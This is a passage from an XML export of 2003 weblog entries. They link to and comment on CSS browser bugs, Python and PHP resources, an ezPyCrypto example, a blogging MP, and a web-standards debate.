&lt;p&gt;I've tested it in Phoenix, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 and Opera 7 on Windows. If you spot any problems in Mac based browsers please let me know.&lt;/p&gt;</field>
		<field name="created">2003-04-09 16:47:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">902</field>
		<field name="title">IE6, italics and horizontal scrollbars</field>
		<field name="slug">italicBlockquotesCauseScrollba</field>
		<field name="body">&lt;p&gt;And the prize for freakiest &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; bug in the universe goes to... &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6! I was having a problem with the new design and a horizontal scrollbar occuring in IE6 for no readily apparent reason (the same bug had plagued my previous design as well). Bill Simoni on CSS discuss &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/24379&quot; title=&quot;RE: [css-d] Horizontal scrollbar in IE6?&quot;&gt;pointed out&lt;/a&gt; that the scrollbar wasn't appearing on the comment / entry pages. After an extensive trial and error session I tracked the problem down to the fact that my blockquotes were in italic. If I removed the &lt;code&gt;font-style: italic&lt;/code&gt; property from the blockquote declaration, the horizontal scrollbar vanished. No other changes were needed.&lt;/p&gt;

&lt;p&gt;Truly bizzare.&lt;/p&gt;</field>
		<field name="created">2003-04-09 20:19:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">903</field>
		<field name="title">Views on Python</field>
		<field name="slug">viewOnPython</field>
		<field name="body">&lt;p&gt;Two views on Python, from &lt;a href=&quot;http://radio.weblogs.com/0102677/2003/04/04.html#a53&quot;&gt;Kevin Altis&lt;/a&gt; and &lt;a href=&quot;http://www.ntk.net/2003/04/04/&quot; title=&quot;Need To Know 2003-04-04: Tracking&quot;&gt;NTK&lt;/a&gt; respectively:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0102677/2003/04/04.html#a53&quot;&gt;&lt;p&gt;
Python is an Agile programming language!
&lt;/p&gt;&lt;/blockquote&gt;


&lt;blockquote cite=&quot;http://www.ntk.net/2003/04/04/&quot;&gt;&lt;p&gt;
Python is like the Lament Configuration in Hellraiser: looks
         like an exotic puzzle, is actually a gateway to a world of
         programming discipline and pleasure beyond pain.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-04-10 14:44:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">904</field>
		<field name="title">HEML</field>
		<field name="slug">heml</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://edtechdev.org/blog/archives/001112.html#001112&quot;&gt;Ed Tech Dev&lt;/a&gt;, &lt;a href=&quot;http://heml.mta.ca/heml-cocoon/description&quot;&gt;HEML&lt;/a&gt;, the Historical Event Event Markup and Linking project, looks like a really interesting concept. It defines an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; format for marking up historical events, along with tools based on Java and &lt;acronym title=&quot;eXtensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt; that can convert Heml data in to &lt;acronym title=&quot;Scalable Vector Graphics&quot;&gt;SVG&lt;/acronym&gt; timelines and other useful representations.&lt;/p&gt;

&lt;blockquote cite=&quot;http://heml.mta.ca/heml-cocoon/description#id2750945&quot;&gt;&lt;p&gt;
Consider, for instance, twelve diaries or memoirs, each a different view of the Siege of Sarajevo in 1994 and published on the web. They would include entries about events such as the stationing of troops or the evacuation of a certain region on such-and-such a day. If a standard form of mark-up were used to tag the text that recorded these events and their date and location, a computer could collect this information and associate it with the document. It would then be possible to search for descriptions of events on a certain day, or in a certain region or both, and retrieve references to the proper section of the pertinent memoir or memoirs.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-04-10 15:39:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">905</field>
		<field name="title">Accessibility and DRM</field>
		<field name="slug">accessiblityAndDRM</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.accessify.com/archives/2003_04_06_news-archives.asp#200127270&quot; title=&quot;Digital Rights Wrong for Accessibility&quot;&gt;Accessify&lt;/a&gt;, Joe Clark's analysis of &lt;a href=&quot;http://joeclark.org/access/resources/DRM.html&quot;&gt;Accessibility implications of digital rights management&lt;/a&gt;. Also, the new issue of &lt;a href=&quot;http://www.madeforall.com/&quot;&gt;Made For All&lt;/a&gt; includes an &lt;a href=&quot;http://www.madeforall.com/features/joe_clark.html&quot;&gt;interview with Joe Clark&lt;/a&gt; which focusses on web accessibility.&lt;/p&gt;</field>
		<field name="created">2003-04-10 18:47:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">906</field>
		<field name="title">Isolating Crashing Bugs</field>
		<field name="slug">identifyingCrashingBugs</field>
		<field name="body">&lt;p&gt;CodeBitch's &lt;a href=&quot;http://www.macedition.com/cb/cb_20030407.php&quot; title=&quot;Crash as crash can&quot;&gt;tips on isolating &quot;crashing&quot; bugs&lt;/a&gt; in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; are mostly common sense, but are well worth reading in any case. Her methods could easily be adapted to help track down less serious bugs as well.&lt;/p&gt;</field>
		<field name="created">2003-04-10 19:23:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">907</field>
		<field name="title">URI Design Resources</field>
		<field name="slug">uriDesignResources</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.steptwo.com.au/columntwo/archives/000587.html#000587&quot; title=&quot;Best practice URL design&quot;&gt;Column Two&lt;/a&gt;, pixelcharmer's collection of &lt;a href=&quot;http://www.pixelcharmer.com/fieldnotes/archives/process_designing/2003/000285.html&quot;&gt;URI design resources&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-11 02:59:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">908</field>
		<field name="title">Verbose Regular Expressions</field>
		<field name="slug">verboseRegularExpressions</field>
		<field name="body">&lt;p&gt;Ned Batchelder describes &lt;a href=&quot;http://www.nedbatchelder.com/blog/index.html&quot;&gt;Verbose Python regular expressions&lt;/a&gt;. This is one of the things I've known about (as in known that they exist) for ages but have never got around to using. I've been working with some pretty heavy regular expressions recently that could really do with the clarity of being defined in verbose format with comments.&lt;/p&gt;

&lt;p&gt;&lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; also has support for verbose &lt;acronym title=&quot;Regular Expressions&quot;&gt;REs&lt;/acronym&gt;, thanks to the excellent &lt;a href=&quot;http://www.php.net/manual/en/ref.pcre.php&quot; title=&quot;PHP: Regular Expression Functions (Perl-Compatible)&quot;&gt;pcre functions&lt;/a&gt;. Just use the 'x' modifier as explained on &lt;a href=&quot;http://www.php.net/manual/en/pcre.pattern.modifiers.php&quot; title=&quot;PHP: Pattern Modifiers&quot;&gt;this manual page&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-11 03:01:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">909</field>
		<field name="title">PHP5 and Questioning OOP</field>
		<field name="slug">moreOnPHP5andQuestioningOOP</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.php-con.com/2003/east/interviews/hughes.php&quot;&gt;An Interview with Sterling Hughes on PHP5&lt;/a&gt; from the PHP-Con site:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.php-con.com/2003/east/interviews/hughes.php&quot;&gt;&lt;p&gt;
Personally, while I have programmed with both C++ and Java, I am mostly a procedural guy. I feel that most object oriented programming consists of abstracting different problems into the same problem and then resolving that problem. Sure it makes it easier, but its incredibly inefficient for developing a small set of interconnected programs, which really is the whole point in web development.&lt;/p&gt;

&lt;p&gt;That's not to say I'm unhappy with PHP5. Most of the stuff in PHP5 is great, most notably exceptions; I'll certainly be taking advantage of many of the new features in Zend Engine 2. But most of my code is procedural, and Zend Engine 2 is mostly an object oriented functionality upgrade.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;That's the second time this week I've come across an opinion that questions the benefits of the &lt;acronym title=&quot;Object Oriented Programming&quot;&gt;OOP&lt;/acronym&gt;-at-all-costs approach to programming. The first was in Paul Graham's &lt;a href=&quot;http://www.paulgraham.com/hundred.html&quot;&gt;The Hundred Year Language&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.paulgraham.com/hundred.html&quot;&gt;&lt;p&gt;Somehow the idea of reusability got attached to object-oriented programming in the 1980s, and no amount of evidence to the contrary seems to be able to shake it free. But although some object-oriented software is reusable, what makes it reusable is its bottom-upness, not its object-orientedness. Consider libraries: they're reusable because they're language, whether they're written in an object-oriented style or not.&lt;/p&gt;

&lt;p&gt;I don't predict the demise of object-oriented programming, by the way. Though I don't think it has much to offer good programmers, except in certain specialized domains, it is irresistible to large organizations. Object-oriented programming offers a sustainable way to write spaghetti code. It lets you accrete programs as a series of patches. Large organizations always tend to develop software this way, and I expect this to be as true in a hundred years as it is today.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As undergraduates, we have been exposed to the joys of object oriented programming from our first week at Uni, possible because we're supposedly destined for the large organisations Paul mentions. It's nice to see the view from the other side of the fence for a change.&lt;/p&gt;</field>
		<field name="created">2003-04-11 09:44:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">910</field>
		<field name="title">Lots of RSS Aggregators</field>
		<field name="slug">lotsOfRssAggregators</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://edtechdev.org/blog/archives/001119.html#001119&quot; title=&quot;RSS Readers Wiki&quot;&gt;Ed Tech Dev&lt;/a&gt; (and others), an &lt;a href=&quot;http://www.hebig.org/blogs/archives/main/000877.php&quot;&gt;RSS Feed Reader / News Aggregators directory&lt;/a&gt; and an &lt;a href=&quot;http://ourpla.net/cgi/pikie?RssReaders&quot;&gt;RSS Readers wiki page&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2003-04-11 10:44:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">911</field>
		<field name="title">PHP SOAP Documentation</field>
		<field name="slug">phpSoapDocumentation</field>
		<field name="body">&lt;p&gt;Finally some good documentation on using &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt; with &lt;acronym title=&quot;PHP: Hypretext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;: &lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/39&quot;&gt;PEAR::SOAP Client Fast Start&lt;/a&gt; and &lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/40&quot;&gt;Extending PEAR::SOAP WSDL&lt;/a&gt;, both from the excellent &lt;a href=&quot;http://www.phppatterns.com/&quot;&gt;phpPatterns&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-11 15:02:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">912</field>
		<field name="title">CSS Support Charts</field>
		<field name="slug">cssSupportCharts</field>
		<field name="body">&lt;p&gt;Time to update bookmarks: The Web Review &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; Support Charts, which went offline several weeks ago, are back at a &lt;a href=&quot;http://devedge.netscape.com/library/xref/2003/css-support/&quot; title=&quot;CSS Support Charts&quot;&gt;new home on Netscape DevEdge&lt;/a&gt;. Despite not having been signiicantly updated since 2001 they still are still an excellent reference to refer to for &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; browser compatibility issues. More information from &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/2003b.html#t200304011&quot; title=&quot;Master of Your Cascade&quot;&gt;Eric Meyer&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-11 16:00:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">913</field>
		<field name="title">Yahoo Search uses CSS</field>
		<field name="slug">yahooSearchUsesCSS</field>
		<field name="body">&lt;p&gt;In all the fuss about Yahoo's &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/07/#moreOnTheNewYahoo&quot; title=&quot;More on the new Yahoo&quot;&gt;new search interface&lt;/a&gt; over the past few days, the extensive use of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; in the &lt;a href=&quot;http://search.yahoo.com/search?p=example+search&quot; title=&quot;An example search&quot;&gt;results pages&lt;/a&gt; was almost completely overlooked, probably because the page still contains a small layout table for the top and bottom navigation. The results themselves are served up as a styled ordered list, at least for modern browsers (thanks to a server side browser sniffer). More information in &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/24505&quot; title=&quot;[css-d] CSS-powered Yahoo! Search&quot;&gt;this message&lt;/a&gt; from Yahoo's Brian Ghidinelli, who is seeking feedback.&lt;/p&gt;</field>
		<field name="created">2003-04-12 20:11:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">914</field>
		<field name="title">Google Accusations Analysed</field>
		<field name="slug">bigBrotherDiscussed</field>
		<field name="body">&lt;p&gt;Search Engine Watch (with a nice new design but horrible markup) have an &lt;a href=&quot;http://www.searchenginewatch.com/sereport/article.php/2175251&quot; title=&quot;Google And The Big Brother Nomination&quot;&gt;extensive analysis&lt;/a&gt; of the recent &quot;Big Brother&quot; &lt;a href=&quot;http://www.google-watch.org/bigbro.html&quot; title=&quot;Google as Big Brother&quot;&gt;accusations&lt;/a&gt; that have been levelled at Google.&lt;/p&gt;</field>
		<field name="created">2003-04-13 14:05:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">915</field>
		<field name="title">GNU Utilities for Win32</field>
		<field name="slug">gnuUtilitiesForWin32</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://randomfoo.net/?p=2003_04_06_archive.inc#200138889&quot;&gt;Via Leonard&lt;/a&gt;, &lt;a href=&quot;http://unxutils.sourceforge.net/&quot;&gt;GNU utilities for Win32&lt;/a&gt; provides a whole bunch of useful utilities in Windows friendly binaries, without the need for external libraries such as Cygwin, including gzip, tar, flex, bison, make, grep and the ever useful wget. The package also includes diff, which makes me feel a lot more comfortable about using it from within &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; scripts as portability to Windows will no longer be an issue.&lt;/p&gt;</field>
		<field name="created">2003-04-13 14:10:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">916</field>
		<field name="title">100 random pictures</field>
		<field name="slug">av100RandomPictures</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://ga2so.com/random2.php&quot;&gt;100 random AltaVista pictures&lt;/a&gt; is fascinating, if not guaranteed work-safe.&lt;/p&gt;</field>
		<field name="created">2003-04-13 14:11:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">917</field>
		<field name="title">CSS Layout Generators</field>
		<field name="slug">cssLayoutGenerators</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.fu2k.org/alex/css/layouts/3Col_OrderedAbsolute.mhtml&quot;&gt;A tool for generating 3 column CSS layouts&lt;/a&gt; that appears to use Big John's &lt;a href=&quot;http://www.positioniseverything.net/ordered-floats.html&quot; title=&quot;Source Ordered Columns&quot;&gt;Source Ordered Columns&lt;/a&gt; technique. &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; generating tools are a thoroughly excellent idea and I'm surprised no one has done one before; the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; community is at a point now where there are some well understood, solid layout techniques available and some kind of tool that helps generate frameworks for new designers could really help speed up &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; adoption.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update (April 15th, 17:30):&lt;/strong&gt; It appears that this wasn'e really intended for public consumption outside of css-discuss. Alex Robinson has posted a note to this effect on the page. It also doesn't use the source ordered columns technique, but &lt;a href=&quot;http://www.fu2k.org/alex/css/layouts/3Col_NN4_FMFM.mhtml&quot; title=&quot;Ordered Columns, float-margin/float-margin model&quot;&gt;this alternative tool&lt;/a&gt; does.&lt;/p&gt;</field>
		<field name="created">2003-04-13 14:20:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">918</field>
		<field name="title">Creating a Collage</field>
		<field name="slug">creatingACollage</field>
		<field name="body">&lt;p&gt;As someone with virtually no graphic design skills, &lt;a href=&quot;http://www.sitepoint.com/article/1050/&quot;&gt;Create A Collage With Fireworks&lt;/a&gt; on SitePoint is the kind of article I'd love to see more of.&lt;/p&gt;</field>
		<field name="created">2003-04-13 14:53:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">919</field>
		<field name="title">Opera 7 for Linux</field>
		<field name="slug">opera7ForLinux</field>
		<field name="body">&lt;p&gt;Opera 7.10 &lt;a href=&quot;http://www.opera.com/pressreleases/en/2003/04/11/&quot; title=&quot;Opera 7.10 for Windows and Linux Beta Released&quot;&gt;is out&lt;/a&gt;, and includes the first Opera 7 beta release for Linux. I'll have to try this out when I get home.&lt;/p&gt;</field>
		<field name="created">2003-04-13 15:02:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">920</field>
		<field name="title">The Dullest Blog in the World</field>
		<field name="slug">dullestBlog</field>
		<field name="body">&lt;p&gt;There's something almost Zen-like about &lt;a href=&quot;http://www.wibsite.com/wiblog/dull/&quot;&gt;the dullest blog in the world&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-13 17:14:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">921</field>
		<field name="title">Home Improvements</field>
		<field name="slug">homeImprovements</field>
		<field name="body">&lt;p&gt;Phil Ringnalda &lt;a href=&quot;http://philringnalda.com/blog/2003/04/dont_make_me_look_stupid.php&quot; title=&quot;Don&amp;apos;t make me look stupid&quot;&gt;posted a rant&lt;/a&gt; about sites that don't tell you how their comments system works - like this one. I've been meaning to add instructions for ages but never got round to it; now I have. Hopefully this will mean less comments with no line breaks or links that don't work.&lt;/p&gt;</field>
		<field name="created">2003-04-13 21:13:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">922</field>
		<field name="title">Artima Weblogs</field>
		<field name="slug">artimaWeblogs</field>
		<field name="body">&lt;p&gt;Artima.com recently &lt;a href=&quot;http://www.artima.com/weblogs/viewpost.jsp?thread=4128&quot; title=&quot;Introducing Artima Weblogs&quot;&gt;started hosting weblogs&lt;/a&gt;, with membership by invitation only. With people like &lt;a href=&quot;http://www.artima.com/weblogs/index.jsp?blogger=12088&quot;&gt;Guido van Rossum&lt;/a&gt; and &lt;a href=&quot;http://www.artima.com/weblogs/index.jsp?blogger=12206&quot;&gt;Ward Cunningham&lt;/a&gt; already signed up Artima looks set to become a very interesting corner of the blogging world.&lt;/p&gt;</field>
		<field name="created">2003-04-13 22:58:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">923</field>
		<field name="title">Easy Python Cryptography</field>
		<field name="slug">ezPyCrypto</field>
		<field name="body">&lt;p&gt;Via Garth Kidd's &lt;a href=&quot;http://www.deadlybloodyserious.com/Python/2003/04/14.html&quot; title=&quot;14 Apr 2003&quot;&gt;Python cryptography roundup&lt;/a&gt;, &lt;a href=&quot;http://www.freenet.org.nz/ezPyCrypto/&quot;&gt;ezPyCrypto&lt;/a&gt; is a cryptography API so simple even I can use it. Unfortunately the example code is only available in the download archive (not on the web site) but here's an overview of how it works:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import ezPyCrypto
# Generate a 512 bit key
key = ezPyCrypto.key(512)

text = 'This will be encrypted'

# Encrypt the string
encrypted = key.encString(text)
print encrypted

# Unencrypt the string
decrypted = key.decString(encrypted)
print decrypted

# Export the public key
public = key.exportKey()
# This can now be saved or distributed

# Export the private key
private = key.exportKeyPrivate()
# This can now be saved somewhere safe

# Encrypting using an already generated public key:
key = ezPyCrypto.key()
key.importKey(public)
encrypted = key.encString(text)

# Decrypting using an already generated private key:
key = ezPyCrypto.key()
key.importKey(private)
decrypted = key.decString(text)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's pretty much it. The class also has support for passphrases which can be used to add an extra layer of protection to a private key, as well as methods to handle crypotgraphic signing and verification.&lt;/p&gt;

&lt;p&gt;ezPyCrypto is an easy to use wrapper for the excellent &lt;a href=&quot;http://www.amk.ca/python/code/crypto.html&quot;&gt;PyCrypto&lt;/a&gt; module, and includes PyCrypto (and a handy Windows installer) in the distribution.&lt;/p&gt;</field>
		<field name="created">2003-04-14 11:04:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">924</field>
		<field name="title">The technology of the Matrix</field>
		<field name="slug">matrixTechnology</field>
		<field name="body">&lt;p&gt;Wired have a &lt;a href=&quot;http://www.wired.com/wired/archive/11.05/matrix2.html&quot; title=&quot;MATRIX2&quot;&gt;fascinating article&lt;/a&gt; on the technology being used for &lt;cite&gt;The Matrix Reloaded&lt;/cite&gt;. They've apparently achieved photo-realistic &lt;acronym title=&quot;Computer-Generated Imagery&quot;&gt;CGI&lt;/acronym&gt; humans using a technique caleld &quot;image-based rendering&quot; based on taking a huge number of high resolution photos from different angles and using them to generate the 3D geometry of a scene.&lt;/p&gt;

&lt;p&gt;The technique was first demonstrated in &lt;a href=&quot;http://www.debevec.org/Campanile/&quot;&gt;The Campanile Movie&lt;/a&gt;, where it was used to create a flyover of a University campus using still photos taken from a kite. It's worth downloading the film to get an idea of just how powerful the technique is.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://www.metafilter.com/mefi/24981&quot; title=&quot;Will we ever know what is real anymore?&quot;&gt;MetaFilter discussion&lt;/a&gt; about the Wired article has comments from the author of the article himself.&lt;/p&gt;</field>
		<field name="created">2003-04-14 11:26:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">925</field>
		<field name="title">Last 40 Comments Page</field>
		<field name="slug">last40Comments</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;/comments/&quot;&gt;Last 40 comments&lt;/a&gt;, more for my use than anything else (I keep missing comments posted on older entries).&lt;/p&gt;</field>
		<field name="created">2003-04-14 11:48:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">926</field>
		<field name="title">Interview with the Blogging MP</field>
		<field name="slug">theBloggingMP</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.tom-watson.co.uk/archives/000380.html&quot; title=&quot;Write the web&quot;&gt;Tom Watson&lt;/a&gt; himself, a &lt;a href=&quot;http://writetheweb.com/Members/gilest/tomwatson-weblog&quot; title=&quot; The politician and his weblog &quot;&gt;short interview&lt;/a&gt; with Tom, the UK's first blogging &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://writetheweb.com/Members/gilest/tomwatson-weblog&quot;&gt;
&lt;p&gt;It is a huge political risk (Watson's spoof page for teenagers caught the eyes of the national newspapers last week) but Watson is determined to stick with it.&lt;/p&gt;

&lt;p&gt;Watson admits: &quot;I'll get some stick but I think eventually people will see that is fundamentally a more honest way of communicating with people who want to know what you think and do. Oh, and its also great fun and slightly addictive.&quot;&lt;/p&gt;

&lt;p&gt;What's more, Watson is convinced that weblogging will catch on among his fellow MPs.&lt;/p&gt;

&lt;p&gt;&quot;If the software makes publishing your thoughts and ideas easier, it will certainly catch on. For me, there is the advantage of getting ideas and opinions in the public domain quickly, without the reliance on your good profession (journalists) to interpret/edit what I've said.&quot;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Not only is &lt;a href=&quot;http://www.tom-watson.co.uk/&quot;&gt;Tom's weblog&lt;/a&gt; a great precedent for a more open, accessible government, it is also a fascinating insight in to the day to day life of an elected representative in this country. It's a shame all the press coverage so far has been about the &lt;a href=&quot;http://www.tom-watson.co.uk/teens.html&quot;&gt;spoof teens page&lt;/a&gt; rather than the format of the site itself.&lt;/p&gt;</field>
		<field name="created">2003-04-15 14:46:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">927</field>
		<field name="title">Python Roundup</field>
		<field name="slug">pythonRoundup</field>
		<field name="body">&lt;p&gt;No blogging for a while; I'm getting stuck in to a whole load of University coursework. In the meantime though here are some Python links I've been hoarding for a few days on my private wiki:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.xml.com/pub/a/2003/04/09/py-xml.html&quot;&gt;Gems from the archives&lt;/a&gt; - a couple of useful Python snippets from the archives of the Python &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt; mailing list.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/python/2003/03/27/pythonian.html&quot;&gt;What's New in Python 2.3?&lt;/a&gt; - extensive article with coverage of list &lt;em&gt;strides&lt;/em&gt; (an extension of the list slicing operator), the new logging and date modules and other improvements to the language.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.prescod.net/python/IsPythonLisp.html&quot;&gt;On the Relationship Between Python and Lisp&lt;/a&gt; discusses similarities between the two languages and points out that many of Python's lisp-like features (lambdas, filter and map) are being considered for deprecation.&lt;/li&gt;
 &lt;li&gt;Python in relationships: &lt;a href=&quot;http://vsbabu.org/mt/archives/2003/04/08/pywife.html&quot; title=&quot;PyWife&quot;&gt;Husband&lt;/a&gt; and &lt;a href=&quot;http://vsbabu.org/tharunya/blog/archives/2003/03/26/python_diary.html&quot; title=&quot;Python Diary&quot;&gt;Wife&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-04-17 16:56:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">928</field>
		<field name="title">Flamin' CSS</field>
		<field name="slug">flaminCSS</field>
		<field name="body">&lt;p&gt;Dave Winer, in a &lt;a href=&quot;http://scriptingnews.userland.com/2003/04/18#When:4:01:26AM&quot; title=&quot;Scripting News Archive&quot;&gt;follow up&lt;/a&gt; to his recent &lt;a href=&quot;http://blogs.law.harvard.edu/crimson1/comments?u=crimson1&amp;amp;p=44&amp;amp;link=http%3A%2F%2Fblogs.law.harvard.edu%2Fcrimson1%2F2003%2F04%2F17%23a44&quot; title=&quot;Comments in response to &amp;apos;This is simple, and it does what I want&amp;apos;&quot;&gt;CSS problems&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/2003/04/18#When:4:01:26AM&quot;&gt;&lt;p&gt;
I used to work reasonably well with designers until CSS came along. Now my writing is supposed to be a soldier in the fight for Web &quot;standards.&quot; Help. My work has to look great in MSIE, and I can't wait for the other browsers to fix their bugs. So I'm going to use paragraphs and breaks and old unbuggy stuff like that where I need to.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/archives/2003/04/18/enough_already.html&quot; title=&quot;Enough already&quot;&gt;responds&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://diveintomark.org/archives/2003/04/18/enough_already.html&quot;&gt;&lt;p&gt;
I used to work reasonably well with Dave Winer until the RSS validator came along. Now my feed is supposed to be a soldier in the fight for &quot;validation&quot; and &quot;standards&quot;. Help. My syndicated feed has to look great in NetNewsWire (according to my site statistics, it has more than 4 times the market share of Radio), and I can’t wait for the other newsreaders to fix their bugs. So I’m going to skip required elements and use invalid XML whenever it suits me, and to hell with the validator, and to hell with these newfangled &quot;standards&quot;.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Jeffrey Zeldman offers some &lt;a href=&quot;http://www.zeldman.com/daily/0303a.shtml#csswiner&quot; title=&quot;Winer and CSS: enough already&quot;&gt;solid arguments&lt;/a&gt; against tag soup:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.zeldman.com/daily/0303a.shtml#csswiner&quot;&gt;&lt;p&gt;
Over the past two years, Mr Winer has repeatedly complained about CSS and structural, semantic markup, and has even asked what is wrong with tag soup. As one who sees the web as a vehicle for writing, Mr Winer should know instinctively what is wrong with tag soup. Tag soup bloats web pages, slowing their delivery for all users and especially penalizing dialup users. Tag soup corrupts data by yoking it to nonstandard formatting instructions. These formatting instructions work in some environments but fail in others. For instance, they get in the way when trying to deliver content to text-oriented devices with small view ports, such as Palm Pilots and web-enabled cell phones. Why should the users of these devices be forced to download 40K of HTML formatting instructions that will not work for them? And then have to download 40K more when they link to a new page? And 40 more on the next?
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Those are the key posts. The resulting flame war can mostly be found &lt;a href=&quot;http://www.intertwingly.net/blog/1345.html&quot;&gt;here&lt;/a&gt; (along with trackbacks to pretty much every other bit of blog coverage).&lt;/p&gt;

&lt;p&gt;Meanwhile, Sterling Hughes poses &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000162.html&quot; title=&quot;View Source&quot;&gt;a valid point&lt;/a&gt; in favour of presentational markup in response to &lt;a href=&quot;http://www.intertwingly.net/blog/1346.html&quot; title=&quot;View source&quot;&gt;Sam Ruby&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.edwardbear.org/blog/archives/000162.html&quot;&gt;&lt;p&gt;
Your site [code] still is signifigantly harder to read, at least for me. I'm constantly cross referencing - HTML to CSS, HTML to CSS, HTML to CSS, HTML to ... When you dissassociate style information, I contend that its really not about the humans editing the file anymore. Its about robots understanding the file. This point is made even clearer by XHTML 2.0, where they remove the style attribute.
